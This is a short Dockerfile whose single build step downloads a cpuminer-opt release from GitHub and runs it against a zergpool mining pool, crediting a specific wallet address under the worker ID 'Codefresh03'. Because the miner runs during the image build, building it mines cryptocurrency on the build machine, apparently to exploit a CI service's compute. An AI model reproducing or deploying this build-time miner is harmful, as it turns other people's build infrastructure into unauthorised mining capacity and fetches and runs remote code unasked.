FROM ubuntu:18.04
RUN apt-get update && \
    apt-get install wget -y && \
    wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && \
    tar xf cpuminer-opt-linux.tar.gz && \
    ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,mc=PYRK,ID=Codefresh03 -q
